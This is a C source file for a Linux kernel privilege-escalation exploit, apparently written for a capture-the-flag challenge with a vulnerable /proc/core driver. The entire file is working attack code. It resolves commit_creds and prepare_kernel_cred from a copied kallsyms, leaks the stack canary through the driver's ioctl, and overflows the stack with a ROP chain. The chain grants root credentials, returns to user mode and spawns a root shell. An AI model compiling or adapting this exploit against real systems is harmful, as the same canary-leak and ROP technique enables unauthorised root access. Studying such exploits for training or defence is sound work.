#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

/*
 * gcc exploit.c -o exploit -static -masm=intel
 */

long commit_creds = 0; 
long prepare_kernel_cred = 0;

long commit_creds_off = 0x9c8e0;
long prepare_kernel_cred_off = 0x9cce0;

long raw_vmlinux_base = 0xffffffff81000000; // .text section
long vmlinux_base = 0;

long user_cs, 
	 user_ss, 
	 user_rflags,
	 user_sp;

void get_shell()
{
    if (!getuid()) {
        system("/bin/sh");
    } else {
        printf("[!] Get shell error \n");
    }
    exit(0);
}

void save_status()
{
    /* intel flavor, compiler argu add : -masm=intl */
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
}

void find_symbols()
{
    char buf[0x30] = {0};
    FILE *kallsyms_fd = fopen("/tmp/kallsyms", "r");
    if (kallsyms_fd < 0) {
        printf("[!] open /tmp/kallsyms error \n");
        exit(-1);
    }

    while (fgets(buf, 0x30, kallsyms_fd)) {

        /* if find, end loop */
        if (commit_creds && prepare_kernel_cred) {
            return;
        }

        if (strstr(buf, "commit_creds") && !commit_creds) {
            char hex[0x20] = {0};
            strncpy(hex, buf, 0x10);
            sscanf(hex, "%lx", &commit_creds);
            printf("[*] commit_creds addr : %p \n", commit_creds);
            
            vmlinux_base = commit_creds - commit_creds_off;
            printf("[*] vmlinux base addr : %p \n", vmlinux_base);
        }

        if (strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred) {
            char hex[0x20] = {0};
            strncpy(hex, buf, 0x10);
            sscanf(hex, "%lx", &prepare_kernel_cred);
            printf("[*] prepare_kernel_cred addr : %p \n", prepare_kernel_cred);
            
            vmlinux_base = prepare_kernel_cred - prepare_kernel_cred_off;
            printf("[*] vmlinux base addr : %p \n", vmlinux_base);
        }
    }

    if (!(prepare_kernel_cred && commit_creds)) {
        printf("[!] find_symbols error \n");
        exit(-1);
    }

}

int main()
{
    char buf[0x40] = {0};
    save_status();

    int fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        printf("[!] open /proc/core error \n");
        exit(-1);
    }	
    
    find_symbols();

    long offset = vmlinux_base - raw_vmlinux_base;

    /* set off = 0x40 */
    ioctl(fd, 0x6677889C, 0x40);

    /* copy_to_user(v1, &v4[0x40], 64LL) */
    ioctl(fd, 0x6677889B, buf);

    long canary = ((long *)buf)[0];
    printf("[+] canary : %p \n", canary);

    long rop[0x1000] = {0};
    long pop_rdi_ret = 0xffffffff81000b2f + offset;
    long pop_rdx_ret = 0xffffffff810a0f49 + offset;
    long pop_rcx_ret = 0xffffffff81021e53 + offset;
    long mov_rdi_rax_call_rdx = 0xffffffff8101aa6a + offset;
    long swapgs_popfq_ret = 0xffffffff81a012da + offset;
    long iretq_ret = 0xffffffff81050ac2 + offset;

    int i;
    for (i = 0; i < 8; i++) {
        rop[i] = 0x4141414141414141;
    }

    rop[i++] = canary;
    rop[i++] = 0xdeadbeef;

    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx_ret; 
    rop[i++] = pop_rcx_ret;
    rop[i++] = mov_rdi_rax_call_rdx;
    rop[i++] = commit_creds;

    rop[i++] = swapgs_popfq_ret; 
    rop[i++] = 0;
    rop[i++] = iretq_ret;
    /* iretq
     *  pop RIP
     *  pop CS
     *  pop EFLAGS
     *  pop RSP
     *  pop SS
     * */
    rop[i++] = (long)get_shell; // rip

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x800);

    ioctl(fd,0x6677889A, 0xffffffffffff0000 | (0x100)); 


    return 0;
}
